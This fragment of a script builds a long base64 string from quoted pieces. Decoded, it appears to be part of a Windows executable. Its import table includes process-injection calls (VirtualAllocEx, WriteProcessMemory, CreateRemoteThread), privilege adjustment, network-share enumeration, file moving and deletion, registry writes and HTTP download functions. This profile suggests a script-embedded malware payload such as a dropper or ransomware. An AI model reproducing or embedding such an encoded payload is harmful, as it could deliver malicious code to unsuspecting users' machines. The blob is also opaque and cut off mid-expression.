'6wAAACcAAACyAAAAdQAAAAkAAACDAAAALAAAABoAAAAbAAAAbgAAAFoAAACgAAAAUgAAADsAAADWAAAAswAAACkAAADjAAAALwAAAIQAAABTAAAA0QAAAAAAAADtAAAAIAAAAPwAAACxAAAAWwAAAGoAAADLAAAAvgAAADkAAABKAAAATAAAAFgAAADPAAAA0AAAAO8AAACqAAAA+wAAAEMAAABNAAAAMwAAAIUAAABFAAAA+QAAAAIAAAB/AAAA' + 
'UAAAADwAAACfAAAAqAAAAFEAAACjAAAAQAAAAI8AAACSAAAAnQAAADgAAAD1AAAAvAAAALYAAADaAAAAIQAAABAAAAD/AAAA8wAAANIAAADNAAAADAAAABMAAADsAAAAXwAAAJcAAABEAAAAFwAAAMQAAACnAAAAfgAAAD0AAABkAAAAXQAAABkAAABzAAAAYAAAAIEAAABPAAAA3AAAACIAAAAqAAAAkAAAAIgAAABGAAAA7gAAALgAAAAUAAAA' + 
'3gAAAF4AAAALAAAA2wAAAOAAAAAyAAAAOgAAAAoAAABJAAAABgAAACQAAABcAAAAwgAAANMAAACsAAAAYgAAAJEAAACVAAAA5AAAAHkAAADnAAAAyAAAADcAAABtAAAAjQAAANUAAABOAAAAqQAAAGwAAABWAAAA9AAAAOoAAABlAAAAegAAAK4AAAAIAAAAugAAAHgAAAAlAAAALgAAABwAAACmAAAAtAAAAMYAAADoAAAA3QAAAHQAAAAfAAAA' + 
'SwAAAL0AAACLAAAAigAAAHAAAAA+AAAAtQAAAGYAAABIAAAAAwAAAPYAAAAOAAAAYQAAADUAAABXAAAAuQAAAIYAAADBAAAAHQAAAJ4AAADhAAAA+AAAAJgAAAARAAAAaQAAANkAAACOAAAAlAAAAJsAAAAeAAAAhwAAAOkAAADOAAAAVQAAACgAAADfAAAAjAAAAKEAAACJAAAADQAAAL8AAADmAAAAQgAAAGgAAABBAAAAmQAAAC0AAAAPAAAA' + 
'sAAAAFQAAAC7AAAAFgAAAACNQADoAwAAMDEyMzQ1Njc4OUFCQ0RFRlcAB4AAAAAAAY1AAAAAAAAAjUAA/////6DYQQCw2EEAwNhBANTYQQDk2EEA9NhBAATZQQAY2UEAKNlBADjZQQBM2UEAXNlBAGzZQQB82UEAjNlBAJzZQQCo2UEAvNlBAMzZQQDc2UEA8NlBAAABAAEAAQEAAAEBAAAAAQABAYvAEOBBACDgQQAw4EEAAAAAAAAAAAAAAAAA' + 
'AI1AAAGNQAABjUAAAY1AAACNQACURUIApEVCAOxFQgD4RUIAyFNCAPxFQgDkRkIAXiQuWygpfD8rKlx7AI1AAISUQgB8jUAANHlAAFR4QAAMWEMAqN9BAJx4QACcd0AAhHlAAMR5QAAsekAAVHlAADRYQwAoMEMA1HhAABQQQwA8ekAACDBDABR6QAA8eUAAzHhAAKx4QAAkWEMABHpDALR3QAD8V0MAHHpAAPx5QAAkekAAHDBDAIR3QAA8eEAA' + 
'fHdAAFx5QAC8d0AARHhAAPx4QAC0eEAAMFhDAJjfQQCseUAALFhDABQyQwA3WEMAzHlAAAwwQwDwF0MAjHlAAAQwQwAQMEMAdHdAAChYQwDUeUAAHHhAABR4QAAkeEAADHpAAIx3QADUd0AATHhAAGx4QACUeEAAfHlAADJYQwDo30EAwN9BAOR4QAAA4EEAiN9BAKR5QACMeEAAMVhDAJR5QAC0eUAACHpDAPDfQQAgWEMAEBBDAIR4QAAkeUAA' + 
'ZHlAAPR5QAC430EArHdAADNYQwDsd0AAxHhAAJx5QAD8d0AABHpAAPR3QACw30EA3HlAABBYQwAgMEMA7HhAAKR4QACQ30EAGBBDAGR4QAAMeEAAIBBDADR6QAAMeUAApHdAANx4QAAAWEMAvHlAAOR5QABEMEMA7HlAAHR4QAAMekMAyN9BADVYQwAEeUAAGFhDACgQQwC4eUMAFFhDAEx5QAD0eEAAbHlAABxYQwBAEEMARHpAACx5QADY30EA' + 
'lHdAACx4QADMd0AAvHhAAMR3QAD430EAdHlAAFQYQwDQ30EAFHlAANx3QADg30EAHHlAABwQQwA0eEAABHhAAHx4QADkd0AA7BdDADZYQwCg30EAMDBDAARZQwBceEAARHlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAECBEwAAAAAAAAAAAICHEwBghBMAUIETAAAAAAAAAAAAyIcTAHCEEwBggRMAAAAAAAAAAAAIiBMAgIQTAHiBEwAAAAAAAAAAAF6IEwCYhBMAAIITAAAAAAAAAAAApIoTACCFEwAcghMAAAAAAAAAAAD+ihMAPIUTAFiCEwAAAAAA' + 
'AAAAAPSLEwB4hRMAaIITAAAAAAAAAAAAMIwTAIiFEwC0gxMAAAAAAAAAAAACkhMA1IYTAPSDEwAAAAAAAAAAACSTEwAUhxMA/IMTAAAAAAAAAAAAOpMTAByHEwAghBMAAAAAAAAAAADqkxMAQIcTACiEEwAAAAAAAAAAAAaUEwBIhxMAMIQTAAAAAAAAAAAAMJQTAFCHEwA8hBMAAAAAAAAAAABilBMAXIcTAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + 
'jocTAJ6HEwC0hxMAAAAAANaHEwDqhxMA+ocTAAAAAAAUiBMAJogTADaIEwBEiBMAUogTAAAAAABsiBMAdogTAH6IEwCMiBMAnIgTAKyIEwDGiBMA3IgTAPSIEwAMiRMAHIkTADKJEwBIiRMAVIkTAGCJEwByiRMAhIkTAJaJEwCoiRMAvIkTANKJEwDkiRMA9okTAASKEwAWihMAIooTADCKEwA+ihMATooTAFqKEwB2ihMAgooTAJSKEwAAAAAA' + 
'sooTAMCKEwDOihMA2IoTAOSKEwDwihMAAAAAAAqLEwAeixMALosTAEqLEwBYixMAZosTAHqLEwCOixMAmosTAKyLEwC4ixMAyosTANiLEwDmixMAAAAAAPyLEwAMjBMAIIwTAAAAAAA+jBMAVIwTAGCMEwB2jBMAhowTAJiMEwCqjBMAvowTAM6MEwDcjBMA7owTAASNEwAQjRMAII0TADCNEwA+jRMASo0TAFiNEwBkjRMAdI0TAIyNEwCojRMA' + 
'uI0TAMiNEwDYjRMA5o0TAPSNEwACjhMAEo4TACqOEwA6jhMATI4TAFyOEwBujhMAgo4TAJiOEwCujhMAwI4TANCOEwDgjhMA9I4TAAqPEwAgjxMANI8TAE6PEwBojxMAeI8TAIyPEwCejxMAtI8TAMiPEwDajxMA5o8TAP6PEwAUkBMALJATADqQEwBMkBMAXJATAG6QEwB6kBMAlJATAKyQEwC6kBMAyJATANyQEwD0kBMABpETABSREwAskRMA' + 
'PJETAFKREwBkkRMAdpETAISREwCSkRMAoJETALCREwDEkRMA0JETAOKREwD0kRMAAAAAABCSEwAikhMANJITAEiSEwBckhMAbJITAHySEwCMkhMAnpITAK6SEwDAkhMA0pITAOCSEwD0khMADJMTAAAAAAAykxMAAAAAAEaTEwBakxMAbpMTAH6TEwCSkxMAqJMTALyTEwDQkxMAAAAAAPaTEwAAAAAAEpQTAAAAAAA8lBMAVJQTAAAAAABwlBMA' + 
'hpQTAJyUEwCylBMAxJQTANiUEwDmlBMA9pQTAAAAAACOhxMAnocTALSHEwAAAAAA1ocTAOqHEwD6hxMAAAAAABSIEwAmiBMANogTAESIEwBSiBMAAAAAAGyIEwB2iBMAfogTAIyIEwCciBMArIgTAMaIEwDciBMA9IgTAAyJEwAciRMAMokTAEiJEwBUiRMAYIkTAHKJEwCEiRMAlokTAKiJEwC8iRMA0okTAOSJEwD2iRMABIoTABaKEwAiihMA' + 
'MIoTAD6KEwBOihMAWooTAHaKEwCCihMAlIoTAAAAAACyihMAwIoTAM6KEwDYihMA5IoTAPCKEwAAAAAACosTAB6LEwAuixMASosTAFiLEwBmixMAeosTAI6LEwCaixMArIsTALiLEwDKixMA2IsTAOaLEwAAAAAA/IsTAAyMEwAgjBMAAAAAAD6MEwBUjBMAYIwTAHaMEwCGjBMAmIwTAKqMEwC+jBMAzowTANyMEwDujBMABI0TABCNEwAgjRMA' + 
'MI0TAD6NEwBKjRMAWI0TAGSNEwB0jRMAjI0TAKiNEwC4jRMAyI0TANiNEwDmjRMA9I0TAAKOEwASjhMAKo4TADqOEwBMjhMAXI4TAG6OEwCCjhMAmI4TAK6OEwDAjhMA0I4TAOCOEwD0jhMACo8TACCPEwA0jxMATo8TAGiPEwB4jxMAjI8TAJ6PEwC0jxMAyI8TANqPEwDmjxMA/o8TABSQEwAskBMAOpATAEyQEwBckBMAbpATAHqQEwCUkBMA' + 
'rJATALqQEwDIkBMA3JATAPSQEwAGkRMAFJETACyREwA8kRMAUpETAGSREwB2kRMAhJETAJKREwCgkRMAsJETAMSREwDQkRMA4pETAPSREwAAAAAAEJITACKSEwA0khMASJITAFySEwBskhMAfJITAIySEwCekhMArpITAMCSEwDSkhMA4JITAPSSEwAMkxMAAAAAADKTEwAAAAAARpMTAFqTEwBukxMAfpMTAJKTEwCokxMAvJMTANCTEwAAAAAA' + 
'9pMTAAAAAAASlBMAAAAAADyUEwBUlBMAAAAAAHCUEwCGlBMAnJQTALKUEwDElBMA2JQTAOaUEwD2lBMAAAAAAG9sZWF1dDMyLmRsbAAAAABTeXNGcmVlU3RyaW5nAAAAU3lzUmVBbGxvY1N0cmluZ0xlbgAAAFN5c0FsbG9jU3RyaW5nTGVuAGFkdmFwaTMyLmRsbAAAAABSZWdRdWVyeVZhbHVlRXhBAAAAAFJlZ09wZW5LZXlFeEEAAABSZWdD' + 
'bG9zZUtleQB1c2VyMzIuZGxsAAAAAEdldEtleWJvYXJkVHlwZQAAAERlc3Ryb3lXaW5kb3cAAABMb2FkU3RyaW5nQQAAAE1lc3NhZ2VCb3hBAAAAQ2hhck5leHRBAGtlcm5lbDMyLmRsbAAAAABHZXRBQ1AAAAAAU2xlZXAAAABWaXJ0dWFsRnJlZQAAAFZpcnR1YWxBbGxvYwAAAABHZXRUaWNrQ291bnQAAAAAUXVlcnlQZXJmb3JtYW5jZUNv' + 
'dW50ZXIAAABHZXRDdXJyZW50VGhyZWFkSWQAAAAASW50ZXJsb2NrZWREZWNyZW1lbnQAAAAASW50ZXJsb2NrZWRJbmNyZW1lbnQAAAAAVmlydHVhbFF1ZXJ5AAAAAFdpZGVDaGFyVG9NdWx0aUJ5dGUAAABNdWx0aUJ5dGVUb1dpZGVDaGFyAAAAbHN0cmxlbkEAAAAAbHN0cmNweW5BAAAATG9hZExpYnJhcnlFeEEAAAAAR2V0VGhyZWFkTG9j' + 
'YWxlAAAAR2V0U3RhcnR1cEluZm9BAAAAR2V0UHJvY0FkZHJlc3MAAAAAR2V0TW9kdWxlSGFuZGxlQQAAAABHZXRNb2R1bGVGaWxlTmFtZUEAAAAAR2V0TG9jYWxlSW5mb0EAAAAAR2V0Q29tbWFuZExpbmVBAAAARnJlZUxpYnJhcnkAAABGaW5kRmlyc3RGaWxlQQAAAABGaW5kQ2xvc2UAAABFeGl0UHJvY2VzcwAAAEV4aXRUaHJlYWQAAAAA' + 
'Q3JlYXRlVGhyZWFkAAAAAFdyaXRlRmlsZQAAAFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAAABSdGxVbndpbmQAAABSYWlzZUV4Y2VwdGlvbgAAAABHZXRTdGRIYW5kbGUAAGtlcm5lbDMyLmRsbAAAAABUbHNTZXRWYWx1ZQAAAFRsc0dldFZhbHVlAAAAVGxzRnJlZQAAAFRsc0FsbG9jAAAAAExvY2FsRnJlZQAAAExvY2FsQWxsb2MAAHVz' + 
'ZXIzMi5kbGwAAAAAVHJhbnNsYXRlTWVzc2FnZQAAAABQZWVrTWVzc2FnZUEAAAAATXNnV2FpdEZvck11bHRpcGxlT2JqZWN0cwAAAE1lc3NhZ2VCb3hBAAAATG9hZFN0cmluZ0EAAABHZXRTeXN0ZW1NZXRyaWNzAAAAAERpc3BhdGNoTWVzc2FnZUEAAAAAQ2hhck5leHRXAAAAQ2hhckxvd2VyQnVmZlcAAAAAQ2hhck5leHRBAAAAQ2hhckxv' + 
'd2VyQnVmZkEAAAAAQ2hhckxvd2VyQQAAAABDaGFyVXBwZXJBAAAAAENoYXJUb09lbUEAAG1wci5kbGwAAABXTmV0T3BlbkVudW1XAAAAV05ldEVudW1SZXNvdXJjZVcAAABXTmV0Q2xvc2VFbnVtAGtlcm5lbDMyLmRsbAAAAABXcml0ZVByb2Nlc3NNZW1vcnkAAAAAV3JpdGVGaWxlAAAAV2FpdEZvclNpbmdsZU9iamVjdAAAAFZpcnR1YWxR' + 
'dWVyeQAAAABWaXJ0dWFsQWxsb2NFeAAAAABUZXJtaW5hdGVUaHJlYWQAAABUZXJtaW5hdGVQcm9jZXNzAAAAAFNldExhc3RFcnJvcgAAAABTZXRGaWxlVGltZQAAAFNldEZpbGVQb2ludGVyAAAAAFNldEZpbGVBdHRyaWJ1dGVzVwAAAABTZXRFdmVudAAAAABTZXRFbmRPZkZpbGUAAAAAUmVzdW1lVGhyZWFkAAAAAFJlc2V0RXZlbnQAAAAA' + 
'UmVhZEZpbGUAAAAAT3BlblByb2Nlc3MAAABNb3ZlRmlsZVcAAABMb2FkTGlicmFyeUEAAAAATGVhdmVDcml0aWNhbFNlY3Rpb24AAAAASW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbgAAAEdsb2JhbFVubG9jawAAAABHbG9iYWxSZUFsbG9jAAAAR2xvYmFsSGFuZGxlAAAAAEdsb2JhbExvY2sAAAAAR2xvYmFsRnJlZQAAAABHbG9iYWxBbGxv' + 
'YwAAAEdldFZlcnNpb25FeEEAAABHZXRVc2VyRGVmYXVsdExhbmdJRAAAAABHZXRUaWNrQ291bnQAAAAAR2V0VGhyZWFkTG9jYWxlAAAAR2V0U3RkSGFuZGxlAAAAAEdldFByb2NBZGRyZXNzAAAAAEdldE1vZHVsZUhhbmRsZUEAAAAAR2V0TW9kdWxlRmlsZU5hbWVXAAAAAEdldE1vZHVsZUZpbGVOYW1lQQAAAABHZXRMb2NhbGVJbmZvQQAA' + 
'AABHZXRMb2NhbFRpbWUAAAAAR2V0TGFzdEVycm9yAAAAAEdldEZ1bGxQYXRoTmFtZUEAAAAAR2V0RmlsZUF0dHJpYnV0ZXNXAAAAAEdldEZpbGVBdHRyaWJ1dGVzQQAAAABHZXRFeGl0Q29kZVRocmVhZAAAAEdldEVudmlyb25tZW50VmFyaWFibGVXAAAAR2V0RW52aXJvbm1lbnRWYXJpYWJsZUEAAABHZXREcml2ZVR5cGVBAAAAR2V0RGlz' + 
'a0ZyZWVTcGFjZUEAAABHZXREYXRlRm9ybWF0QQAAAABHZXRDdXJyZW50VGhyZWFkSWQAAAAAR2V0Q3VycmVudFByb2Nlc3MAAABHZXRDb21tYW5kTGluZVcAAABHZXRDUEluZm8AAABJbnRlcmxvY2tlZEluY3JlbWVudAAAAABJbnRlcmxvY2tlZEV4Y2hhbmdlAAAASW50ZXJsb2NrZWREZWNyZW1lbnQAAAAARnJlZUxpYnJhcnkAAABGb3Jt' + 
'YXRNZXNzYWdlQQAAAABGaW5kTmV4dEZpbGVXAAAARmluZEZpcnN0RmlsZVcAAAAARmluZENsb3NlAAAARmlsZVRpbWVUb0xvY2FsRmlsZVRpbWUAAABGaWxlVGltZVRvRG9zRGF0ZVRpbWUAAABFeGl0VGhyZWFkAAAAAEV4aXRQcm9jZXNzAAAARW51bUNhbGVuZGFySW5mb0EAAABFbnRlckNyaXRpY2FsU2VjdGlvbgAAAABEdXBsaWNhdGVI' + 
'YW5kbGUAAABEZWxldGVGaWxlVwAAAERlbGV0ZUNyaXRpY2FsU2VjdGlvbgAAAENyZWF0ZVRocmVhZAAAAABDcmVhdGVSZW1vdGVUaHJlYWQAAAAAQ3JlYXRlUHJvY2Vzc1cAAAAAQ3JlYXRlUHJvY2Vzc0EAAAAAQ3JlYXRlUGlwZQAAAABDcmVhdGVGaWxlVwAAAENyZWF0ZUZpbGVBAAAAQ3JlYXRlRXZlbnRBAAAAAENyZWF0ZURpcmVjdG9y' + 
'eVcAAAAAQ29weUZpbGVXAAAAQ29tcGFyZVN0cmluZ1cAAAAAQ29tcGFyZVN0cmluZ0EAAAAAQ2xvc2VIYW5kbGUAYWR2YXBpMzIuZGxsAAAAAFJlZ1NldFZhbHVlRXhXAAAAAFJlZ1NldFZhbHVlRXhBAAAAAFJlZ1F1ZXJ5VmFsdWVFeFcAAAAAUmVnUXVlcnlWYWx1ZUV4QQAAAABSZWdPcGVuS2V5RXhXAAAAUmVnT3BlbktleUV4QQAAAFJl' + 
'Z0VudW1LZXlFeEEAAABSZWdEZWxldGVWYWx1ZUEAAABSZWdEZWxldGVLZXlBAAAAUmVnQ3JlYXRlS2V5RXhXAAAAUmVnQ3JlYXRlS2V5RXhBAAAAUmVnQ2xvc2VLZXkAAABPcGVuUHJvY2Vzc1Rva2VuAAAAAExvb2t1cFByaXZpbGVnZVZhbHVlQQAAAEFkanVzdFRva2VuUHJpdmlsZWdlcwBrZXJuZWwzMi5kbGwAAAAAU2xlZXAAd2luaW5l' + 
'dC5kbGwAAABJbnRlcm5ldFJlYWRGaWxlAAAAAEludGVybmV0T3BlblVybEEAAAAASW50ZXJuZXRPcGVuQQAAAEludGVybmV0Q29ubmVjdEEAAAAASW50ZXJuZXRDbG9zZUhhbmRsZQAAAEh0dHBTZW5kUmVxdWVzdEEAAAAASHR0cE9wZW5SZXF1ZXN0QQAAAABIdHRwQWRkUmVxdWVzdEhlYWRlcnNBAABzaGVsbDMyLmRsbAAAAFNoZWxsRXhl' + 
'Y3V0ZVcAc2hlbGwzMi5kbGwAAABTSEdldFNwZWNpYWxGb2xkZXJMb2NhdGlvbgAAc2hlbGwzMi5kbGwAAABTSEdldFBhdGhGcm9tSURMaXN0VwAAAABTSEdldE1hbGxvYwBvbGVhdXQzMi5kbGwAAAAAU2FmZUFycmF5UHRyT2ZJbmRleAAAAFNhZmVBcnJheUdldFVCb3VuZAAAAABTYWZlQXJyYXlHZXRMQm91bmQAAAAAU2FmZUFycmF5Q3Jl' + 
'YXRlAAAAVmFyaWFudENoYW5nZVR5cGUAAABWYXJpYW50Q29weQAAAFZhcmlhbnRDbGVhcgAAAABWYXJpYW50SW5pdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAPAEAAAAwFDAsMEgwVDBkMIQwkDCUMJgwnDCgMKQwqDCsMLgwxTDYMCkxLTExMUkxWDFcMXgxgDGEMYgx' + 
'jDGQMZQxmDGcMaAxujHCMcox0jHaMeIx6jHyMfoxAjIKMhIyGjIiMioyMjI6MkIySjJSMloyYjJqMnIyejKCMooykjKaMqIyqjKyMroywjLKMtIy2jLiMg4zFjMeMyYzKjVANVE1dDWONaQ1szW6NcU11TUKNhg2RTZNNlI2dzaANpM2njapNrg20TYgNyY3LDc3N9w3RjlVOVw55jkQOiA6KjpBOlY6aTp2OpM6nDrSOtw69Dr6OhI7KjtlO287' + 
'hjvOO+s79zsKPBM8GjwgPDU8QTxePGc8pTzHPC89Rz2BPYs9oj0BPj4+Vz6IPpI+mD6vP78/yT/iPwAAACAAAKAAAABIMJcwpzCxMMwwXzFvMSIyKzI9MkkyVDL2NAE1EDUpNTw1VzVdNXU1gjWKNZM1oTWuNfM1EzagNy04OTh4OK04zTgkOXo5qTm+OWY6xzrdOss70TvvOxE8HDzsPPA89jz6PAQ9Fz0bPSE9JT01PTo9Xz2KPcI9yj3XPd09' + 
'6z36PQc+Gj4yPk4+bz6IPqE+Jj87P0g/aD8AAAAwAACAAAAALTBUMFgwXDBgMGQwaDBsMHAwdDAjMlwy6TL2MjYzPzNwM3cz5TOMNH82lzaoNsQ23DbtNvk2QjmBOZE5pznFOds58zkIOkE6rTsLPEM9jj3iPfY9/j0UPiw+Oj5uPoo+lj6qPrQ+xz73PiQ/LT9fP2g/nT+kP8Y/AEAAAKAAAAAVMEowuzD/MAsxUzJ7MoIymjK8MvAy+DIDMy8z' + 
'OTNEM1UzlDOqM8Ez+DMINA40FDQaNB80JTQuND40QzRINE00UjRgNGo0lTSeNKU0DDUUNUA1TDVwNXo1nzWpNbM1uzXBNc816jX/NQk2DjYtNjI2UjZmNnI2izbVNt424zYFNxI3KDdnN3Q3izeaN7k3xDcBOR05SzwAAABQAAAkAAAAoTDaNOM06jXzNfc8YT10PT0/Wz95P5M/4T8AAABgAADkAQAAAzCbMaUxtDHEMcsxHTIuMm4ydTKHMqUy' + 
'rjK6MsEy4jVrNp42JjdPN3Y36jf3NwM4CjgUOB44LTg/OFI4WjhiOGo4cjh6OKI4zDjnOPE4/DgPORc5LjlMOVQ5YjlnOYA5kDmhOa05uznFOeM56Dn7OQc6EjocOiY6MDo6OkQ6TjpYOmI6bDp2OoA6ijqcOq46tjq+OsY6zjrWOt465jruOvY6/joGOw47FjseOyY7Ljs2Oz47RjtOO1Y7XjtmO247djt+O4Y7jjuWO547pjuuO7Y7vjvGO847' + 
'1jveO+Y77jv2O/47BjwOPBY8HjwmPC48Njw+PEY8TjxWPF48ZjxuPHY8fjyGPI48ljyePKY8rjy2PL48xjzOPNY83jzmPO489jz+PAY9Dj0WPR49Jj0uPTY9Pj1GPU49Vj1ePWY9bj12PX49hj2OPZY9nj2mPa49tj2+PcY9zj3WPd495j3uPfY9/j0GPg4+Fj4ePiY+Lj42Pj4+kz6fPqc+rz7CPtA+8D74Pvw+AD8EPwg/DD8QPxQ/GD8cPyA/' + 
'JD8oPyw/MD80P0A/YD9oP2w/cD90P3g/fD+AP4Q/iD+MP5A/lD+YP5w/oD+kP7g/2D/gP+Q/6D/sP/A/9D/4P/w/AAAAcAAAiAIAAAAwBDAIMAwwEDAUMBgwHDAsMEwwVDBYMFwwYDBkMGgwbDBwMHQweDB8MIAwhDCIMIwwkDCoMMgw0DDUMNgw3DDgMOQw6DDsMPAw9DD4MPwwADEEMQgxDDEQMYQy6TTxNPY2Cjd0N3w3hDeMN5Q3nDekN6w3' + 
'tDe8N8Q3zDfUN9w35DfsN/Q3/DcEOAw4FDgcOCQ4LDg0ODw4RDhMOFQ4XDhkOGw4dDh8OIQ4jDiUOJw4pDisOLQ4vDjEOMw41DjcOOQ47Dj0OPw4BDkMORQ5HDkkOSw5NDk8OUQ5TDlUOVw5ZDlsOXQ5fDmEOYw5lDmcOaQ5rDm0Obw5xDnMOdQ53DnkOew59Dn8OQQ6DDoUOhw6JDosOjQ6PDpEOkw6WDpsOnQ6eDp8OoA6hDqIOow6kDqUOqI6' + 
'tDrUOtw64DrkOug67DrwOvQ6+Dr8OhA7MDs4Ozw7QDtEO0g7TDtQO1Q7WDtsO4w7lDuYO5w7oDukO6g7rDuwO7Q7xDvkO+w78Dv0O/g7/DsAPAQ8CDwMPBw8PDxEPEg8TDxQPFQ8WDxcPGA8ZDx8PJw8pDyoPKw8sDy0PLg8vDzAPMQ81Dz0PPw8AD0EPQg9DD0QPRQ9GD0cPSw9TD1UPVg9XD1gPWQ9aD1sPXA9dD2EPaQ9rD2wPbQ9uD28PcA9' + 
'xD3IPcw94D0APgg+DD4QPhQ+GD4cPiA+JD4oPjg+WD5gPmQ+aD5sPnA+dD54Pnw+gD6QPrA+uD68PsA+xD7IPsw+0D7UPtg+6D4IPxA/FD8YPxw/ID8kPyg/LD8wP0A/YD9oP2w/cD90P3g/fD+AP4Q/iD+YP7g/wD/EP8g/zD/QP9Q/2D/cP+A/9D8AgAAAhAEAABQwHDAgMCQwKDAsMDAwNDA4MDwwUDBwMHgwfDCAMIQwiDCMMJAwlDCYMKww' + 
'zDDUMNgw3DDgMOQw6DDsMPAw9DAMMSwxNDE4MTwxQDFEMUgxTDFQMVQxZDGEMYwxkDGUMZgxnDGgMaQxqDGsMcAx4DHoMewx8DH0Mfgx/DEAMgQyCDIYMjgyQDJEMkgyTDJQMlQyWDJcMmAydDKUMpwyoDKkMqgyrDKwMrQyuDK8MtQy9DL8MgAzBDMIMwwzEDMUMxgzHDMwM1AzWDNcM2AzZDNoM2wzcDN0M3gzjDOsM7QzuDO8M8AzxDPIM8wz' + 
'0DPUM+QzBDQMNBA0FDQYNBw0IDQkNCg0LDRENFE0WTRoNHU0fTSYNLg0wDTENMg0zDTQNNQ02DTcNOA0ODU8NUA1RDVINUw1UDVoNXQ1eDWUNZw1oDWkNag1rDWwNbQ1uDW8NRQ27jj6OFM5iDnrOSY+dT6FPpA+nT6iPqw+vD7HPtQ+2T6qP74/yj/hP+0/AJAAAGwAAAA7MEwwYjCpMLEw8jGyNMc00jRBNkU2STZNNlE2VTZZNl02YTZlNmk2' + 
'bTZxNnU2eTZ9NoE2hTZRN1g3GjjBOe059Tn9OQU6DTpyOqE6vDrAOsQ6yDrMOgk8Rj1bPWY+9T4HP68/AKAAAIwAAADxMAsxFTF7MVcy+zMrNRI2SDaZNso2PjeIN8M30jdROKM49jhlOWw5qTmtObE5tTm5Ob05wTnFOck5zTnROdU52TndOeE55TnOOug6RjttO4E7lTvGOwU8GjwvPBw9MD17Pbc98z0TPiQ+Oz5uPoE+tD7pPhg/LD89P00/' + 
'YD9sP4w/+j8AsAAAnAAAAHAwbjENMskyDjMTM1gzzjPvMwE0QDRFNFM0dzSnNFw1eDXANdY14zXoNfo1RjZeNnA2iDa0Ng83ITc4N0o3nzfNN/s3LDg+OFU4ZziUOdY67jrzOv86IjtPO1Q7bjuTO8U7/zsJPC88SzxqPHw8pjy6POs8+jwUPSY9YT2BPak9FD5JPmI+cj6LPpo+sz7PPgo/3z8AwAAA7AAAAB8wJDAsMFYwZzBwMCUxLzF5MZQx' + 
'nTEyMmEy8DIqM3AzhzOpM7czvjPWM90z8DMINCc0LzQ7NHs0mTTENNM05zQ6NUE14DUUNi42PTb5Ngs3VTdnN3s3xzfxNyY4NThEOGA4jjiVOJ84pTisOLY4uzjBOMY4zDjRONc43jjkOOk47zj0OPo4ATkHORI5GjkjOS85NTk9OUY5UjlXOWA5aTlyOXs5hDnEOc051jncOe05+Dn9OTU6Uzp8OpY6tDoWOzM7izu+OxY8mDzdPA09Hz1DPVU9' + 
'8T4iP2I/Zz91P34/8D8AAADQAADcAQAABjAvMD0wWDBhMHwwjzCiMKswxjDZMOIwATEPMS4xRjFPMWMxcTGFMaMxxTHUMeIxBTInMjYyRjJOMmMyazKIMpUyVDOEM50z2TMXNCE0zTTqNA41PzVGNVU1XDV6Nac1yjXaNeU16zXzNfg12DffOvE6EDsUOxg7HDsgOyQ7KDssOzA7NDs4Ozw7QDtEO0g7TDtQO1Q7WDtcO2A7ZDtoO2w7cDt0O3g7' + 
'fDuAO4Q7iDuMO5A7lDuYO5w7oDukO6g7rDuwO7Q7uDu8O8A7xDvIO8w70DvUO9g73DvgO+Q76DvsO/A79Dv8OwA8CDwMPBQ8GDwgPCQ8LDwwPDg8PDxEPEg8UDxUPFw8YDxoPGw8dDx4PIA8hDyMPJA8mDycPKQ8qDywPLQ8vDzAPMg8zDzUPNg84DzkPOw88Dz4PPw8BD0IPRA9FD0cPSA9KD0sPTQ9OD1APUQ9TD1QPVg9XD1kPWg9cD10PXw9' + 
'gD2IPYw9lD2YPaA9pD2sPbA9uD28PcQ9yD3QPdQ94z3vPfo9BD4dPic+MT47PkU+Tz5ZPmM+bT53PoE+jD6WPqE+qz62PsA+yz7VPuA+6j7wPvo+AD8KPxQ/Hz8pPzQ/Pj9JP1s/bD98P5Q/AOAAAJQAAABOMVYxXjFmMW4xdjF+MYYxjjGWMZ4xrDHBMc4x0zHgMeUx8jH3MQQyCTIWMhsyKDItMjoyPzJMMlEyXjJjMnAydTKCMocylDKZMqYy' + 
'qzK4Mr0yyjLPMtwy5zIrNEs0azR6NII05zRPOY45yTnYOeg5zDriOtc7HzxQPI48aj2yPbc+BD8SP08/lD8AAADwAACIAAAAATA5ML8w3TAjMWsxlzHYMWQyhjLLMtYy3DLhMnszyzPWM9wz4TNdNNw06TQFNTM1iDXUNfI1IDY6Nkw2nDa8Ntg2UTefNxs4Zji3OMo48TgzOV05pDnUOQ06GjpQOlw6SjwLPVs9rz3nPT8+dj6TPuk+Jj9OP2A/' + 
'mD/JP9s/AAAAAAEAjAAAACMwNTCsMO4wAzE7MUMxdjGUMbAx6TH/MSAy2TL5MwI0SDSwNO00AjWjNdM1GTYlNjI2OjZHNk42YjZuNn02lTabNqY2uTbHNtM2Dje+N9k3/jdBOMw4EDlAOWg5izlKOgg7SDs4PFY8JD1cPRM+LT5sPq4+2z7xPg8/Fz8tP0s/UD+APwAQAQBsAAAAJzCUMKwwFzFaMesy9zIEMxQzKDM0M0gzjTOuM+szEjQ+NIE0' + 
